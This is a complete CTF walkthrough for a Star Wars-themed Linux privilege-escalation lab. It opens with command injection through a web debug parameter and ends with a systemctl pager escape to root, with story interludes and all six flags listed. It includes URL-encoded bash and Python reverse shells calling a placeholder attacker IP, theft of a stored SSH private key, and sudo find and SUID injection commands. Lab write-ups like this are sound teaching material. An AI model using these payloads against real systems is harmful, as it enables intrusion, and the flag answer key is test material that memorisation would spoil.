# Death Star Leak - Complete Walkthrough

⚠️ **SPOILER ALERT** ⚠️ This document contains the complete solution to the CTF challenge.

---

## 🎯 Mission Overview

This walkthrough guides you through all privilege escalation steps from initial access to root.

## 🔍 Phase 1: Reconnaissance

### Step 1: Port Scanning

```bash
nmap -sV -sC -p- <target_ip>
```

Expected open ports:
- **22/tcp** - SSH
- **8080/tcp** - HTTP (Apache web server)

### Step 2: Web Enumeration

Visit `http://<target_ip>:8080`

You'll see the Death Star Imperial Network login page.

## 🚀 Phase 2: Initial Access

### Step 3: Exploring the Web Application

The web application has a login form that accepts Personnel ID and Access Code.

**Key observation:** There's a hint at the bottom mentioning `?debug=true`

### Step 4: Command Injection Vulnerability

Test the debug parameter:
```
http://<target_ip>:8080/?id=test&debug=true
```

The application uses `shell_exec()` without proper sanitization!

**Exploit the command injection:**
```
http://<target_ip>:8080/?id=test%3B%20whoami&debug=true
```

This should execute `whoami` and show `www-data`

### Step 5: Getting a Reverse Shell

Set up a listener on your machine:
```bash
nc -lvnp 4444
```

Inject a reverse shell:
```
http://<target_ip>:8080/?id=test%3B%20bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/<your_ip>/4444%200%3E%261%27&debug=true
```

Or use a simpler Python reverse shell:
```
http://<target_ip>:8080/?id=test;python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])%27&debug=true
```

### Step 6: Stabilize the Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z
stty raw -echo; fg
```

### 🏆 FLAG 1 - Initial Access

```bash
cat /var/www/deathstar/first_access_flag.txt
```

**Flag:** `DSL{w3lc0m3_t0_th3_d3ath_st4r_r3b3l}`

**Story:**
```
╔══════════════════════════════════════════════════════════════╗
║  REBEL TRANSMISSION - ENCRYPTED                              ║
╚══════════════════════════════════════════════════════════════╝

Jyn Erso: "We're in. The Imperial network has been breached."

Cassian Andor: "Good work. Now we need to go deeper. The plans
are protected by layers of Imperial security. We need to climb
through their ranks."

K-2SO: "I calculate a 97.6% chance of detection if we don't
move carefully."

Jyn: "Then we move carefully. For Galen. For the Rebellion."

> Next objective: Find a way to access the stormtrooper account
```

---

## 🎖️ Phase 3: Stormtrooper Access (TK-421)

### Step 7: Enumerate the System

```bash
ls -la /home
# Shows: stormtrooper, imperial-officer, commander, vader
```

Looking at `/home/stormtrooper` permissions:
```bash
ls -la /home/stormtrooper
# We can read the directory
```

### Step 8: Find Credentials

```bash
cat /home/stormtrooper/message.txt
```

This reveals:
- Personnel ID: `TK-421`
- Access Code: `tk421isdown`

### Step 9: SSH as Stormtrooper

From your attacking machine:
```bash
ssh stormtrooper@<target_ip>
# Password: tk421isdown
```

### 🏆 FLAG 2 - Stormtrooper

```bash
cat ~/flag.txt
```

**Flag:** `DSL{tk421_why_4r3nt_y0u_4t_y0ur_p0st}`

**Story:**
```
╔══════════════════════════════════════════════════════════════╗
║  IMPERIAL COMMUNICATION - DETENTION BLOCK AA-23              ║
╚══════════════════════════════════════════════════════════════╝

Imperial Officer: "TK-421, why aren't you at your post?"

[No response]

Officer: "TK-421, do you copy?"

Jyn Erso (disguised in TK-421's armor): *whispers* "We're in
position. The stormtrooper armor worked. Now we need to find
an officer's credentials to access the data vault."

Cassian: "Check his personal files. Imperial officers are
sloppy with security."

> Next objective: Escalate to Imperial Officer clearance
```

---

## 👮 Phase 4: Imperial Officer Access

### Step 10: Search for Privilege Escalation Vectors

As stormtrooper:
```bash
ls -la ~/.backup
```

Found: `officer_key` - An SSH private key!

```bash
cat ~/.backup/officer_key
```

### Step 11: Use the SSH Key

Copy the private key to your attacking machine:
```bash
# On target (stormtrooper session):
cat ~/.backup/officer_key

# On attacker machine:
nano officer_key
# Paste the key
chmod 600 officer_key
```

SSH as imperial-officer:
```bash
ssh -i officer_key imperial-officer@<target_ip>
```

### 🏆 FLAG 3 - Imperial Officer

```bash
cat ~/flag.txt
```

**Flag:** `DSL{1mp3r14l_0ff1c3r_cl34r4nc3_gr4nt3d}`

**Story:**
```
╔══════════════════════════════════════════════════════════════╗
║  IMPERIAL ORDERS - LIEUTENANT RENZ                           ║
╚══════════════════════════════════════════════════════════════╝

Bodhi Rook: "I'm picking up increased security chatter. They
might be onto us."

Chirrut Îmwe: "The Force is with us. We are getting closer to
the plans."

Jyn: "We need Commander Tarkin's access. He has direct oversight
of the Death Star project."

K-2SO: "Lieutenant Renz has sudo privileges. If we can exploit
them, we can assume the commander's identity."

> Next objective: Exploit sudo to become Commander Tarkin
```

---

## ⭐ Phase 5: Commander Access (Grand Moff Tarkin)

### Step 12: Check Sudo Privileges

As imperial-officer:
```bash
sudo -l
```

Output:
```
User imperial-officer may run the following commands:
    (commander) NOPASSWD: /usr/bin/find
```

### Step 13: Exploit Find for Command Execution

The `find` command can execute other commands!

```bash
sudo -u commander /usr/bin/find /home/commander -type f -exec /bin/bash -p \;
```

Or spawn a shell directly:
```bash
sudo -u commander /usr/bin/find . -exec /bin/bash \;
```

You're now `commander`!

### 🏆 FLAG 4 - Commander

```bash
cat ~/flag.txt
```

**Flag:** `DSL{t4rk1n_y0u_m4y_f1r3_wh3n_r34dy}`

**Story:**
```
╔══════════════════════════════════════════════════════════════╗
║  STRATEGIC COMMAND - GRAND MOFF TARKIN                       ║
╚══════════════════════════════════════════════════════════════╝

[Tarkin overlooks the Death Star's superlaser test on Jedha]

Tarkin: "You may fire when ready."

[Massive explosion destroys the holy city]

Jyn (accessing Tarkin's files): "The power... it's worse than
we thought. We NEED those plans."

Cassian: "One more level. Vader has access to the Emperor's
vault. That's where the complete schematics are stored."

Baze Malbus: "How do we get past the Dark Lord himself?"

K-2SO: "There's a system scanner with elevated permissions.
If we can exploit it..."

> Next objective: Exploit the Death Star scanner to become Vader
```

---

## ⚫ Phase 6: Vader Access (Dark Lord of the Sith)

### Step 14: Find SUID Binaries

As commander:
```bash
find / -perm -4000 -type f 2>/dev/null
```

Notice: `/usr/local/bin/deathstar_scanner` owned by vader with SUID bit!

### Step 15: Analyze the Binary

```bash
ls -la /usr/local/bin/deathstar_scanner
# -rwsr-xr-x 1 vader vader ... deathstar_scanner
```

Test it:
```bash
/usr/local/bin/deathstar_scanner test
```

### Step 16: Exploit Command Injection in Scanner

The binary uses `system()` without input sanitization:

```bash
/usr/local/bin/deathstar_scanner "test; /bin/bash -p"
```

Or spawn a shell:
```bash
/usr/local/bin/deathstar_scanner "test; bash -p"
```

You should now be `vader`!

### 🏆 FLAG 5 - Darth Vader

```bash
cat ~/flag.txt
```

**Flag:** `DSL{1_f1nd_y0ur_l4ck_0f_f41th_d1sturb1ng}`

**Story:**
```
╔══════════════════════════════════════════════════════════════╗
║  THE DARK SIDE - DARTH VADER'S CHAMBERS                      ║
╚══════════════════════════════════════════════════════════════╝

[Vader's meditation chamber opens]

Vader: "I find your lack of faith disturbing."

[Through Vader's terminal access]

Jyn: "We've accessed Vader's systems. The Emperor's vault is
within reach."

Cassian: "This is it. Everything we've fought for."

Bodhi: "I'm reading the vault location. Sending coordinates now."

Chirrut: "The Force is strong here. The final test awaits."

K-2SO: "Vader has sudo access to system services. There might
be a path to root through systemctl exploitation or if you can
escape from a pager..."

> Final objective: Breach the Emperor's vault and steal the plans!
```

---

## 👑 Phase 7: Emperor Access (ROOT)

### Step 17: Check Vader's Privileges

```bash
sudo -l
```

Output:
```
User vader may run the following commands:
    (ALL) NOPASSWD: /bin/systemctl status *
```

### Step 18: Exploit Systemctl Pager

The `systemctl status` command uses a pager (like `less` or `more`) when the output is long.

```bash
sudo /bin/systemctl status apache2
```

When the pager opens (indicated by a `:` at the bottom), you can execute commands!

In the pager, type:
```
!/bin/bash
```

This spawns a root shell! 🎉

Alternative method if the pager doesn't trigger:
```bash
# Make the terminal smaller or use a service with lots of output
sudo /bin/systemctl status
# Then press '!' and type 'sh'
```

### 🏆 FLAG 6 - Emperor (ROOT)

```bash
whoami
# root

cd /root/emperor_vault
cat death_star_plans.txt
```

**Final Flag:** `DSL{unl1m1t3d_p0w3r_th3_pl4ns_4r3_y0urs}`

**Final Story:**
```
╔══════════════════════════════════════════════════════════════╗
║              ⭐ EMPEROR'S VAULT - LEVEL 10 ⭐                 ║
║                                                              ║
║                    DEATH STAR PLANS                          ║
║                  CLASSIFICATION: COSMIC TOP SECRET           ║
╚══════════════════════════════════════════════════════════════╝

[The vault doors open, revealing the complete Death Star plans]

Jyn Erso: "We have them. The plans... we actually have them!"

K-2SO: "Congratulations. The odds of success were 3,720 to 1."

Cassian: "Now we need to get them to the Rebellion."

[Galen Erso's hidden message appears in the plans]

Galen Erso: "If you're reading this, then you've found the flaw
I built into the system. A thermal exhaust port, two meters wide.
One precise shot will destroy the entire station."

Jyn: "He put a way to destroy it... My father saved the Rebellion."

Chirrut: "The Force is with us."

Baze: "And I'm one with the Force."

[Death Star plans successfully transmitted to the Rebel Fleet]

Admiral Raddus: "Rogue One, we have the plans! The Death Star's
weakness is exposed. The Rebellion lives!"

╔══════════════════════════════════════════════════════════════╗
║                    MISSION ACCOMPLISHED                       ║
║                                                              ║
║  The Death Star plans are in Rebel hands. Hope has been      ║
║  restored to the galaxy. The Empire's ultimate weapon has    ║
║  a fatal flaw, and the Rebellion now knows how to exploit    ║
║  it.                                                         ║
║                                                              ║
║  Your journey through the Imperial ranks:                    ║
║  ✓ Infiltrator → Stormtrooper → Imperial Officer →          ║
║    Commander → Darth Vader → Emperor                         ║
║                                                              ║
║  May the Force be with you, always.                          ║
╚══════════════════════════════════════════════════════════════╝
```

---

## 📊 Summary of Flags

| Rank | User | Flag | Technique |
|------|------|------|-----------|
| 1. Infiltrator | www-data | `DSL{w3lc0m3_t0_th3_d3ath_st4r_r3b3l}` | Command injection in web app |
| 2. Stormtrooper | stormtrooper | `DSL{tk421_why_4r3nt_y0u_4t_y0ur_p0st}` | Credentials in readable file |
| 3. Imperial Officer | imperial-officer | `DSL{1mp3r14l_0ff1c3r_cl34r4nc3_gr4nt3d}` | SSH private key found |
| 4. Commander | commander | `DSL{t4rk1n_y0u_m4y_f1r3_wh3n_r34dy}` | Sudo find privilege escalation |
| 5. Darth Vader | vader | `DSL{1_f1nd_y0ur_l4ck_0f_f41th_d1sturb1ng}` | SUID binary exploitation |
| 6. Emperor | root | `DSL{unl1m1t3d_p0w3r_th3_pl4ns_4r3_y0urs}` | Systemctl pager escape |

---

## 🎓 Skills Learned

- Web application command injection
- Linux enumeration
- SSH key exploitation
- Sudo privilege abuse (`find` command)
- SUID binary exploitation
- Command injection in compiled binaries
- Systemctl pager escape to root
- Horizontal and vertical privilege escalation

---

## 🎬 The End

*"Rebellions are built on hope."* - Jyn Erso

Thank you for playing Death Star Leak CTF!

May the Force be with you! ⭐
